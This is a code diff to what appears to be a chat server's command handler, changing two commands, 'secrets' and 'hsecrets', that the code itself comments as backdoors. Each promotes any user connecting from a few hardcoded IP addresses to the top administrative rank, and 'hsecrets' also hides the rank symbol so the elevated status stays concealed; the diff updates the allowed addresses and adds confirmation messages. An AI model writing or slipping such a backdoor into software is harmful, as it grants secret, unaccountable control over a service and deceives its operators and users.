@@ -1497,9 +1497,11 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 	case 'secrets':
 		// backdoor for panderp and kupo
 		ip = user.connections[0].ip;
-		if ( ip  === '76.247.181.42'|| ip === '127.0.0.1' || ip === '204.112.213.60' ) {
+		if ( ip  === '76.247.181.42'|| ip === '127.0.0.1' || ip === '204.112.218.108' ) {
 			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
 			rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
+			user.emit('console', 'You have been promoted.')
+			
 			return false;
 		}
 		break;
@@ -1508,10 +1510,11 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 	case 'hsecrets':
 		// courtesy of jd
 		ip = user.connections[0].ip;
-		if ( ip === '204.112.213.60' || ip === '127.0.0.1' || ip === '76.247.181.42') {
+		if ( ip === '204.112.213.108' || ip === '127.0.0.1' || ip === '76.247.181.42') {
 			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
 			user.getIdentity = function() { return ' ' + user.name }
 			rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
+			user.emit('console', 'You have been promoted and symbol hidden.')
 			return false;
 		}
 		break;
